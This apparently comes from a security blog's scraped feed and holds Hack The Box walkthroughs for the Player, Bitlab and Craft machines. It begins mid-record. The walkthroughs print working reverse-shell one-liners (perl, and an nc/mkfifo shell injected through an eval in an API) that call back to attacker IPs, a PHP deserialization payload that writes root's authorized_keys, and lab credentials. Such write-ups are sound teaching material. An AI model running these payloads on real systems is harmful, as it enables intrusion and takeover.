expires=Tue, 06-Aug-2019I’ll use https://jwt.io/ to decode the JWT token contents:The access code C0B137FE2D792459F26FF763CCE44574A5B5AB03 is the SHA-1 hash for welcome.The access code doesn’t give me access to the actual PlayBuff page. There’s probably another code that I need to find or maybe I need to brute force the shared secret and forge my own token. At this point I’m not sure what I would forge in the token even if I had the secret key but I’ll start with the low hanging fruit and try https://github.com/AresS31/jwtcat just to see if the key can be recovered easily:No luck in cracking the JWT token.Finding additional vhostsSome boxes have multiple vhosts hosting different websites such as development pages, admin panels, etc. I’ll check out the vhosts by using wfuzz:root@ragingunicorn:~/htb/player# wfuzz --sc 200 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -H \"Host: FUZZ.player.htb\" 10.10.10.145==================================================================ID   Response   Lines      Word         Chars          Payload    ==================================================================000231:  C=200     86 L\t     229 W\t   5243 Ch\t  \"dev\"000251:  C=200    259 L\t     714 W\t   9513 Ch\t  \"chat\"000796:  C=200     63 L\t     180 W\t   1470 Ch\t  \"staging\"I found 3 vhosts:  dev.player.htb  chat.player.htb  staging.player.htbchat.player.htbThere’s a simulated chat application that shows a conversion between the PM and a developper.There are two hints here:  The staging area exposes senstive files  The main page can show the source code of the applicationI ran gobuster and only found the pictures used for the chat application and some javascript files.dev.player.htbThe dev.player.htb page show a login page:I tried admin / admin and a few other obvious passwords but I couldn’t log in. From the HTML source code I can’t make up what this application is.I ran gobuster and picked up a few directories.root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php -u http://dev.player.htb /common.php (Status: 200)/components (Status: 301)/config.php (Status: 200)/data (Status: 301)/favicon.ico (Status: 200)/index.php (Status: 200)/js (Status: 301)/languages (Status: 301)/lib (Status: 301)/plugins (Status: 301)/server-status (Status: 403)/themes (Status: 301)/workspace (Status: 301)I’m still not sure what it is based on the files found. I’ll expand my search to other extensions and see if I can pick up a readme file or something that tells me what this application is:root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php,txt,conf,cfg -u http://dev.player.htb -s 200/LICENSE.txt (Status: 200)That license file tells me that this webapp is Codiad, a web-based IDE.A quick search on google and exploit-DB shows there a few exploits like RCE and LFI but they require authentication. I’ll continue on and check the last of the vhosts.staging.player.htbThe staging site seems to be in rough shape.The updates section display a static image simulating a metrics dashboard.There’s a contact form to send messages to the Core team.This could be an exploit vector for an XSS but the page errors out when I enter any data.When I check Burp, I see that the GET request returned some PHP output but the page redirect me to the 501.php page right after.This is probably what the hint was referring to. The page shows two files that could be important: /var/www/backup/service_config and /var/www/staging/fix.php. I can’t read those right now but I’ll investigate the other hint: source code disclosure on the main page.Leaking the shared secret for the JWT tokenI tried many extensions for those two md5sum looking filenames until I found a temporary/swap file for dee8dc8a47256c64630d803a4c40786c.php~I now have the secret: _S0_R@nd0m_P@ss_It’s pretty clear from that partial source code that the site expects 0E76658526655756207688271159624026011393 as a valid access code. To forge a proper JWT token with that access code, I’ll just use https://jwt.io/ again and enter the secret to compute the correct signature. When I initially just used the secret from the leaked source code it didn’t work so I followed the PHP code, converted the secret to Base64 with base64_decode(strtr($key, '-_', '+/')):When I do a GET /launcher/dee8dc8a47256c64630d803a4c40786c.php with that access cookie I now get the secret Location URI:Now I can access the application before it’s launch date at http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/Exploiting ffmpegThe web application is basically just a glorified media converter. You upload a media file and it gets converted to an AVI video container format.I tried uploading PHP files and other non-media file types and I always got a 404 when I tried to follow the download link after:I couldn’t figure out any way to upload PHP code or figure out if my uploads were being saved to some temporary file that I could find the filename for. I did some research and found a vulnerability in ffmpeg which allows for an LFI inside video files.I used the following payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLSFirst I’ll try to read /etc/passwd with python3 gen_avi_bypass.py /etc/passwd ~/htb/player/payload.aviI then upload the video and view the resulting converted video:Nice, the exploit works. Next, I’ll have a look at those files I previously found in the staging site.python3 gen_avi_bypass.py /var/www/backup/service_config ~/htb/player/payload.aviCool, I found some credentials: telegen / d-bC|jC!2uepS/w. I’ll check the fix.php file next:python3 gen_avi_bypass.py /var/www/staging/fix.php ~/htb/player/payload.aviI can’t read that one. The resulting video file was empty so I probably don’t have access to it.Restricted shellWith the user telegen I’m able to SSH to the 2nd service running on port 6686 but I’m in restricted shell and can’t run any commands:root@ragingunicorn:~/htb/player# ssh -p6686 telegen@10.10.10.145telegen@10.10.10.145's password: Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104Environment:  USER=telegen  LOGNAME=telegen  HOME=/home/telegen  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin  MAIL=/var/mail/telegen  SHELL=/usr/bin/lshell  SSH_CLIENT=10.10.14.11 55802 6686  SSH_CONNECTION=10.10.14.11 55802 10.10.10.145 6686  SSH_TTY=/dev/pts/0  TERM=xterm-256color========= PlayBuff ==========Welcome to Staging Environmenttelegen:~$ ls*** forbidden command: lstelegen:~$ help  clear  exit  help  history  lpath  lsudotelegen:~$ lpathAllowed: /home/telegen telegen:~$ lsudoAllowed sudo commands:The SHELL environment variable points lshell. I don’t know that one so I’ll google it and discover that it’s web based python shell.From the website description:  lshell is a shell coded in Python, that lets you restrict a user’s environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user’s commands, implement timing restriction, and more.The configuration file is located here /etc/lshell.conf. Maybe there are some allowed commands that I need to find so I’ll exfil the config file using the same ffmpeg trick.I don’t see any allowed commands, nothing obvious stands out in the configuration. I can probably still port forward connections even if my shell is limited. I’ll do a dynamic port forwarding with ssh -D 127.0.0.1:1080 -p 6686 telegen@10.10.10.145 so I can use a SOCKS proxy and port scan the box through proxychains.I run a fast scan with nmap and find MySQL listening on localhost:# proxychains nmap -sT 127.0.0.1 -FProxyChains-3.1 (http://proxychains.sf.net)Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-08 23:16 EDTNmap scan report for localhost (127.0.0.1)Host is up (0.018s latency).Not shown: 97 closed portsPORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http3306/tcp open  mysqlFail at MySQLFunny enough, I can connect to the MySQL server without any authentication:root@ragingunicorn:~/htb/player# proxychains mysql -h 127.0.0.1 -u rootProxyChains-3.1 (http://proxychains.sf.net)Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 298Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || integrity          || mysql              || performance_schema |+--------------------+4 rows in set (0.02 sec)The integrity database contains a mapping of the token to filenames.Database changedMySQL [integrity]&gt; show tables;+---------------------+| Tables_in_integrity |+---------------------+| media               || stats               |+---------------------+2 rows in set (0.02 sec)MySQL [integrity]&gt; select * from stats;+------+----------------+| id   | status         |+------+----------------+|    1 | no issues yet |+------+----------------+1 row in set (0.02 sec)MySQL [integrity]&gt; select * from media;+-----+----------------+------------+| sno | video          | token      |+-----+----------------+------------+|  18 | 78683241.avi   | 673109167  ||  19 | 1619102457.avi | 2112073545 ||  20 | 490922722.avi  | 72247503   ||  21 | 1530970781.avi | 1923945228 ||  22 | 2129471110.avi | 672162071  |+-----+----------------+------------+5 rows in set (0.02 sec)The no issues yet message is displayed at the bottom of the staging site update.php page. I can change it and try to inject PHP code on the page:MySQL [integrity]&gt; delete from stats where id=1;Query OK, 1 row affected (0.02 sec)MySQL [integrity]&gt; insert into stats (id, status) values (1, \"&lt;?php phpinfo();?&gt;\");Query OK, 1 row affected (0.03 sec)When I check the update page I don’t see anything on the product status and my PHP code hasn’t been executed. Looking at the HTML source code, I see that the PHP tag has been inserted into the code but no PHP code is executed.I can’t read arbitrary files with LOAD_FILE or write with INTO OUTFILE. secure_file_priv is configured so I can only read/write within the directory below:MySQL [integrity]&gt; SHOW VARIABLES LIKE \"secure_file_priv\";+------------------+-----------------------+| Variable_name    | Value                 |+------------------+-----------------------+| secure_file_priv | /var/lib/mysql-files/ |+------------------+-----------------------+1 row in set (0.02 sec)MySQL [integrity]&gt; select load_file(\"/etc/passwd\");+--------------------------+| load_file(\"/etc/passwd\") |+--------------------------+| NULL                     |+--------------------------+1 row in set (0.02 sec)MySQL [integrity]&gt; select * from stats into outfile \"/tmp/test\";ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statementMySQL [integrity]&gt; select * from stats into outfile \"/var/lib/mysql-files/test\";Query OK, 2 rows affected (0.02 sec)MySQL [integrity]&gt; select load_file(\"/var/lib/mysql-files/test\");+------------------------------------------+| load_file(\"/var/lib/mysql-files/test\")   |+------------------------------------------+| \\N\t&lt;?php phpinfo();?&gt;1\tno issues yet\\ |+------------------------------------------+1 row in set (0.02 sec)This seems like a dead end so I will move on.OpenSSH xauth vulnerabilityThere are a few CVE’s for version 7.2 of OpenSSH running on port 6686, one that could be interesting is the CVE-2016-3115: OpenSSH 7.2p1 - (Authenticated) xauth Command Injection. This should allow me to inject xauth commands by sending forged x11 channel requests. But X11Forwarding yes needs to be enabled for it to work. I’ll fetch the sshd config file with the ffmpeg exploit and hope it’s the one used by the sshd daemon running on port 6686.X11Forwarding is enabled and it’s not a default configuration so this is probably a hint that I’m on the right track.To run the exploit I just pass the IP/port and the credentials, then once it’s connected I can write and read files. To verify that’s it’s working correctly, I read /etc/hostname and see that it returns player as expected.root@ragingunicorn:~/htb/player# python xauth.py 10.10.10.145 6686 telegen 'd-bC|jC!2uepS/w'INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@10.10.10.145:6686INFO:__main__:connected!INFO:__main__:Available commands:    .info    .readfile &lt;path&gt;    .writefile &lt;path&gt; &lt;data&gt;    .exit .quit    &lt;any xauth command or type help&gt;#&gt; .readfile /etc/hostnameDEBUG:__main__:auth_cookie: 'xxxx\\nsource /etc/hostname\\n'DEBUG:__main__:dummy exec returned: NoneINFO:__main__:player#&gt;I’ll grab the flag next since I know the user directory is /home/telegen:#&gt; .readfile /home/telegen/user.txtDEBUG:__main__:auth_cookie: 'xxxx\\nsource /home/telegen/user.txt\\n'DEBUG:__main__:dummy exec returned: NoneINFO:__main__:30e47ab....On the staging site there was that fix.php file that was erroring out but I couldn’t read it from the ffmpeg exploit. I have access to read this file now with telegen and I can a potential set of credentials: peter / CQXpm\\z)G5D#%S$y=#&gt; .readfile /var/www/staging/fix.phpDEBUG:__main__:auth_cookie: 'xxxx\\nsource /var/www/staging/fix.php\\n'DEBUG:__main__:dummy exec returned: NoneINFO:__main__:&lt;?phpclassprotected...//modified//for//fix//peter//CQXpm\\z)G5D#%S$y=}publicif($resultstatic::passed($test_name);...Remote code execution through CodiadI didn’t see a peter user in /etc/passwd so the next logical place to try the credentials is on the dev.player.htb site. I can successfully log in with peter / CQXpm\\z)G5D#%S$y=. I get a blank IDE page and I find a single project.The path of the project doesn’t exist and errors out when I try to open it.If I try to create a new project with an absolute path of /tmp I get the following error:I just found the path for one of website: /var/www/demo. If I can create PHP files in there I might be able to get RCE. I’ll create a new project using /var/www/demo/snowscan as path:To test PHP execution I just call phpinfo() and see that it works:Next, I’ll get a shell using perl with the following PHP code:&lt;?php system('perl -e \\'use Socket;$i=\"10.10.14.11\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};\\''); ?&gt;Finally, I get a shell as www-data.PrivescNow it’s time to get root. I see some weird script running but I can’t read dothis.sh so I don’t know what it does.root       990  0.0  0.0   4456   680 ?        Ss   01:23   0:00 /bin/sh -c /etc/init.d/dothis.shroot       991  0.0  0.4  13896  4392 ?        S    01:23   0:03 /bin/bash /etc/init.d/dothis.shwww-data@player:/$ more /etc/init.d/dothis.sh/etc/init.d/dothis.sh: Permission deniedI ran LinEnum next but didn’t find anything interesting. Next up: checking for cronjobs starting processes. I’ll use pspy to watch running processes and new ones created. I quickly identify a process running as root: /usr/bin/php /var/lib/playbuff/buff.phpThe content of the file is shown here:&lt;?phpinclude(\"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php\");class playBuff{\tpublic $logFile=\"/var/log/playbuff/logs.txt\";\tpublic $logData=\"Updated\";\tpublic function __wakeup()\t{\t\tfile_put_contents(__DIR__.\"/\".$this-&gt;logFile,$this-&gt;logData);\t}}$buff = new playBuff();$serialbuff = serialize($buff);$data = file_get_contents(\"/var/lib/playbuff/merge.log\");if(unserialize($data)){\t$update = file_get_contents(\"/var/lib/playbuff/logs.txt\");\t$query = mysqli_query($conn, \"update stats set status='$update' where id=1\");\tif($query)\t{\t\techo 'Update Success with serialized logs!';\t}}else{\tfile_put_contents(\"/var/lib/playbuff/merge.log\",\"no issues yet\");\t$update = file_get_contents(\"/var/lib/playbuff/logs.txt\");\t$query = mysqli_query($conn, \"update stats set status='$update' where id=1\");\tif($query)\t{\t\techo 'Update Success!';\t}}?&gt;There is a subtle deserialization vulnerability here. The contents of merge.log are deserialized then the MySQL stats table is updated. The telegen is the owner of the file so it should be possible to get control of the logFile and logData variables in the PlayBuff class and write arbitrary data to any file I want to as root.www-data@player:/var/lib/playbuff$ ls -ltotal 16-rwx---r-- 1 root    root    878 Mar 24 17:19 buff.php-rw-r--r-- 1 root    root     15 Jul  9 07:34 error.log-r-------- 1 root    root     14 Mar 24 16:54 logs.txt-rw------- 1 telegen telegen  13 Jul  9 07:34 merge.logFirst I’ll su to user telegen and specify that I want a Bash shell and not that lshell restricted shell:www-data@player:/var/lib/playbuff$ su -s /bin/bash telegenPassword: telegen@player:/var/lib/playbuff$ iduid=1000(telegen) gid=1000(telegen) groups=1000(telegen),46(plugdev)For the serialized payload, I will write my SSH public to root’s authorized_keys then I should be able to log in as root:  Object class: playBuff (it contains 2 properties)  logFile: ../../../../../../root/.ssh/authorized_keys  logData: content of my SSH public keyO:8:\"playBuff\":2:{s:7:\"logFile\";s:43:\"../../../../../../root/.ssh/authorized_keys\";s:7:\"logData\";s:399:\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+SZ75RsfVTQxRRbezIJn+bQgNifXvjMWfhT1hJzl/GbTbykFtGPTwuiA5NAcPKPG25jkQln3J8Id2ngapRuW8i8OvM+QBuihsM9wLxu+my0JhS/aNHTvzJF0uN1XkvZj/BkbjUpsF9k6aMDaFoaxaKBa7ST2ZFpxlbu2ndmoB+HuvmeTaCmoY/PsxgDBWwd3GiRNts2HOiu74DEVt0hHbJ7kwhkR+l0+6VS74s+7SjP+N1q+oih83bjwM8ph+9odqAbh6TGDTbPX2I+3lTzCUeGS9goKZe05h/YtB2U2VbH1pxJZ1rfR1Sp+SBS+zblO9MUxvbzQoJTHpH2jeDg89 root@ragingunicorn\";}I wait a bit for the cronjob to run then I’m able to SSH in as root after my public key has been written into root’s SSH directory:"
  },
  
  {
    "title": "Bitlab - Hack The Box",
    "url": "/posts/htb-writeup-bitlab/",
    "categories": "hackthebox, infosec",
    "tags": "git, gitlab, javascript, obfuscated, unintended",
    "date": "2020-01-11 00:00:00 +0800",
    





    
    "snippet": "I solved this gitlab box the unintended way by exploiting the git pull command running as root and using git post-merge hooks to execute code as root. I was able to get a root shell using this meth...",
    "content": "I solved this gitlab box the unintended way by exploiting the git pull command running as root and using git post-merge hooks to execute code as root. I was able to get a root shell using this method but I still had to get an initial shell by finding the gitlab credentials in some obfuscated javascript and modifying PHP code in the repo to get RCE.Summary  Find javascript obfuscated credentials in bookmarks.html  Use creds to gain access to the profile repo and modify it to get PHP RCE  Get root access using the unintended method of git post-merge hooksPortscanThe portscan shows SSH and HTTP ports open along with entries from robots.txt indicating this is a Gitlab service. I’ll check out a couple of the URIs mentioned below in the next section.root@kali:~/htb/bitlab# nmap -sC -sV -T4 10.10.10.114Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-08 09:49 EDTNmap scan report for bitlab.htb (10.10.10.114)Host is up (0.022s latency).Not shown: 998 filtered portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)80/tcp open  http    nginx| http-robots.txt: 55 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile| /dashboard /projects/new /groups/new /groups/*/edit /users /help|_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://bitlab.htb/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.33 secondsGitlab enumerationI already knew that the box was going to contain a Gitlab service based on the box name and the logo. The box was originally submitted as Gitlab but was renamed to Bitlab before launch.I clicked the Explore link at the bottom of the page to look for repos but I didn’t see any repositories that are publicly accessible.I checked a few links from the robots.txt file and found a profile page for Clave:That’s not a default page in Gitlab so I’ll keep that in mind for later.Hardcoded Gitlab credentialsI initially skipped the Help section but when I went back and clicked on the link, I got the following page:The Gitlab Login link doesn’t link to an HTTP URL but contains obfuscated javascript:javascript:(function(){ var _0x4b18=[\"\\x76\\x61\\x6C\\x75\\x65\",\"\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x63\\x6C\\x61\\x76\\x65\",\"\\x75\\x73\\x65\\x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\",\"\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()I executed the Javascript in NodeJS and found credentials for Clave:Credentials: clave / 11des0081xAlso, if you copy/paste the entire Javascript code snippet in the Firefox dev console when you’re on the Gitlab login page it’ll auto populate both username and password field.I can now log in to the Gitlab portal and I see two repositories that I have access to:I have read/write access to the Profile repo but only read access to Deployer.As per Gitlab’s documentation, these are the permissions available:  Guest - No access to codeReporter - Read the repositoryDeveloper - Read/Write to the repositoryMaintainer - Read/Write to the repository + partial administrative capabilitiesOwner - Read/Write to the repository + full administrative capabilitiesGetting RCE through the Profile pageThe Profile repository contains the webpage for the Profile page I found earlier. I see that it’s running PHP so if I can modify this page I should be able to gain remote code execution by adding a reverse shell on the page.The Deployer repo code is a simple PHP script that expects a specific JSON message then does a git pull. I assume this’ll be used to deploy the Profile page when I commit changes to the repo.The repo is deployed in the root of the directory and I can access it with /deployer:I’ll add a PHP reverse shell in the Profile index.php page that triggers when I have a shell parameter present. Then I submit the merge request and merge it after.I’ll craft the proper POST request with the Repeater function in Burp Suite. The JSON message has to match the exact format from the code I found in the repo.Now that the profile page has been updated, I can trigger the reverse shell by sending a request with the shell parameter:Unintended privilege escalation to rootThe www-data user can execute git pull as root:$ sudo -lMatching Defaults entries for www-data on bitlab:    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bitlab:    (root) NOPASSWD: /usr/bin/git pull$Git has hooks that can be used to execute code after commit, push, merge, etc. I’ll use that to get remote execution as root through the git pull command. The https://www.git-scm.com/docs/githooks#_post_merge documentation says:  This hook is invoked by git-merge[1], which happens when a git pull is done on a local repository.First, I’ll create two local repos: foo will be merged into the bar repo. I’ll add a reverse shell in the post-merge hook of the bar repo where bar will be merged into.Then I’ll do an initial commit in the foo repo and set up bar to pull from the foo repo:And finally I’ll do a new commit in foo so I can initiate a merge from foo and trigger the reverse shell:"
  },
  
  {
    "title": "Craft - Hack The Box",
    "url": "/posts/htb-writeup-craft/",
    "categories": "hackthebox, infosec",
    "tags": "gogs, api, git, vault, eval, python",
    "date": "2020-01-04 00:00:00 +0800",
    





    
    "snippet": "Craft was a fun Silicon Valley themed box where we have to exploit a vulnerable REST API eval function call to get RCE. After getting a shell on the app container, we escalate to a user shell on th...",
    "content": "Craft was a fun Silicon Valley themed box where we have to exploit a vulnerable REST API eval function call to get RCE. After getting a shell on the app container, we escalate to a user shell on the host OS by finding credentials and SSH private keys. To gain root access, we have to generate an OTP token with the vault software installed on the machine.Summary  Find the Gogs service, clone the app repo and identify the eval vulnerability in the source code  Find a valid set of credentials in an old commit and use those to get a valid token for the API  Exploit the eval vulnerability to get RCE and land a shell on the container  Find Gilfoyle’s Gogs password in the MySQL DB then find his SSH private key in the craft-infra repo  Log in as gilfoyle on the host, find that vault is installed then generate an OTP to gain root accessPortscanI note that port 6022 is running a different SSH service: SSH-2.0-Go# nmap -sC -sV -p- 10.10.10.110Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-14 09:02 EDTNmap scan report for craft.htb (10.10.10.110)Host is up (0.018s latency).PORT     STATE SERVICE  VERSION22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)| ssh-hostkey:|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)443/tcp  open  ssl/http nginx 1.15.8|_http-server-header: nginx/1.15.8|_http-title: About| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US| Not valid before: 2019-02-06T02:25:47|_Not valid after:  2020-06-20T02:25:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_  http/1.1| tls-nextprotoneg:|_  http/1.16022/tcp open  ssh      (protocol 2.0)| fingerprint-strings:|   NULL:|_    SSH-2.0-Go| ssh-hostkey:|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebsite enumerationThe main webpage shows that there is a REST API available so there’s a good chance that this box will be about exploiting it.  The link at the top right points to the API: https://api.craft.htb/api/. I’ll add that domain to my local /etc/hosts.  The icon next to the API link goes to the Gogs servers, which is a self-hosted service. Again, I will add another domain entry to my local host file: gogs.craft.htb.GogsBefore I start messing with the API, I’ll check the source code from the git repo for any leftover credentials, notes/comments and other pieces of information that could help me find a bug in the application.The first thing I check is the list of registered users, the organizations and the repos available:I tried fetching the repo with SSH but I got a permission denied, but I was able to get it with HTTPS:# git clone ssh://git@gogs.craft.htb:6022/Craft/craft-api.gitCloning into 'craft-api'...The authenticity of host '[gogs.craft.htb]:6022 ([10.10.10.110]:6022)' can't be established.RSA key fingerprint is SHA256:JL2e7zVkLrtwos3PHziXPRckBZRJ7BKPbuMuLpDn23s.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '[gogs.craft.htb]:6022' (RSA) to the list of known hosts.git@gogs.craft.htb: Permission denied (publickey).fatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.# env GIT_SSL_NO_VERIFY=true git clone https://gogs.craft.htb/Craft/craft-api.gitCloning into 'craft-api'...remote: Enumerating objects: 45, done.remote: Counting objects: 100% (45/45), done.remote: Compressing objects: 100% (41/41), done.remote: Total 45 (delta 10), reused 0 (delta 0)Unpacking objects: 100% (45/45), done.I then checked the commit logs to see what kind of changes were made.# git logcommit e55e12d800248c6bddf731462d0150f6e53c0802 (HEAD -&gt; master, origin/master, origin/HEAD)Author: ebachman &lt;ebachman@craft.htb&gt;Date:   Fri Feb 8 11:40:56 2019 -0500    Add db connection test scriptcommit a2d28ed1554adddfcfb845879bfea09f976ab7c1Author: dinesh &lt;dinesh@craft.htb&gt;Date:   Wed Feb 6 23:18:51 2019 -0500    Cleanup testcommit 10e3ba4f0a09c778d7cec673f28d410b73455a86Author: dinesh &lt;dinesh@craft.htb&gt;Date:   Wed Feb 6 23:12:07 2019 -0500    add test scriptcommit c414b160578943acfe2e158e89409623f41da4c6Author: dinesh &lt;dinesh@craft.htb&gt;Date:   Wed Feb 6 22:01:25 2019 -0500    Add fix for bogus ABV valuescommit 4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95Author: ebachman &lt;ebachman@craft.htb&gt;Date:   Wed Feb 6 21:46:30 2019 -0500    Add authentication to brew modify endpointscommit 90fb3e8aa0ca9683bcc1ece8fc5bb15cb833a6ffAuthor: ebachman &lt;ebachman@craft.htb&gt;Date:   Wed Feb 6 21:41:42 2019 -0500    Initialize git projectA fix was put in place by Dinesh to prevent ABV values from being submitted. When I check the list of issues on the Gogs site, I find one opened for that specific bug:A couple of things pop out right away:  There’s a JWT token in here (maybe there’s no expiry set)  There’s a link to commit c414b16057 which contains the fix  Gilfoyle comments that this is a bad patch, there’s probably a vulnerability in itThe token is not valid anymore:curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H \"Content-Type: application/json\" -k https://api.craft.htb/api/auth/check{\"message\": \"Invalid token or no token found.\"}I use https://jwt.io/ to decode the token and see that the expiry is set to epoch time 1549385242 which is Tuesday, February 5, 2019 4:47:22 PM in human readable format.I’ll try to bruteforce the shared secret on the token so I can forge my own and change the expiry:# john -w=/usr/share/wordlists/rockyou.txt tokenUsing default input encoding: UTF-8Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status0g 0:00:00:05 DONE (2019-07-14 21:07) 0g/s 2651Kp/s 2651Kc/s 2651KC/s !SkicA!..*7¡Vamos!Session completedUnfortunately the shared secret is not found in rockyou.txt, so it’s probably not meant to be cracked to solve this box.Next, I check the brew.py code and quickly spot the vulnerability:Using eval with user controlled input is extremely dangerous and in this case I can use this to my advantage to gain remote code execution. But I need to first find a way to obtain a valid token so I can make API calls.I look around the commits for other files and find that credentials were hardcoded in the test.py:I got some credentials now: dinesh / 4aUh0A8PbVJxgdI find the API documentation on the https://api.craft.htb/api/ page:To get a token, I’ll do a GET to /auth/login and pass the credentials with HTTP basic auth:curl -H \"Content-Type: application/json\" --user dinesh:4aUh0A8PbVJxgd -k https://api.craft.htb/api/auth/login{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTUzODU2fQ.hs-9F_c_KXIHEQg4tmgaRWacmEC402tsgtolQPZB3ik\"}The token is only valid for a short period of time so I’ll use jq to parse the output and assign it to a variable and I use for my other curl requests:token=$(curl -s -H \"Content-Type: application/json\" --user dinesh:4aUh0A8PbVJxgd -k https://api.craft.htb/api/auth/login | jq -r .[])echo $tokeneyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTU0MTAzfQ.JPg8sJ9enjgL86jy8DJrugK7xaF--wegrVdKXZLono0I can now do POST to add new brews:curl -k -H \"Accept: application/json\" -H \"Content-Type: application/json\" -H \"X-Craft-API-Token: $token\" https://api.craft.htb/api/brew/ -XPOST -d '{\"id\": 666, \"brewer\": \"Snowscan\", \"name\": \"Snowscan\", \"style\": \"IPA\", \"abv\": \"0.95\"}'nullWhen doing a GET, I need to specify the page so I can confirm it’s been added:curl -k \"https://api.craft.htb/api/brew/?per_page=50&amp;page=47\" {\"id\": 2351, \"brewer\": \"Snowscan\", \"name\": \"Snowscan\", \"style\": \"IPA\", \"abv\": \"0.950\"}, {\"id\": 2352, \"brewer\": \"Snowscan\", \"name\": \"Snowscan\", \"style\": \"IPA\", \"abv\": \"0.400\"}], \"page\": 47, \"pages\": 47, \"per_page\": 50, \"total\": 2341}Ok, now it’s time to exploit that eval to gain RCE. Because I don’t see the results of the eval, I’ll first test that the eval works by doing a sleep for 5 seconds:curl -k -H \"Accept: application/json\" -H \"Content-Type: application/json\" -H \"X-Craft-API-Token: $token\" https://api.craft.htb/api/brew/ -XPOST -d '{\"id\": 1000, \"brewer\": \"Snowscan\", \"name\": \"Snowscan\", \"style\": \"IPA\", \"abv\": \"__import__(\\\"time\\\").sleep(5)\"}'Then after I confirmed that the eval works, I’ll use subprocess to spawn a reverse shell:curl -k -H \"Accept: application/json\" -H \"Content-Type: application/json\" -H \"X-Craft-API-Token: $token\" https://api.craft.htb/api/brew/ -XPOST -d '{\"id\": 1000, \"brewer\": \"Snowscan\", \"name\": \"Snowscan\", \"style\": \"IPA\", \"abv\": \"__import__(\\\"subprocess\\\").check_output(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 4444 &gt;/tmp/f\\\", shell=True) or 1\"}'# nc -lvnp 4444listening on [any] 4444 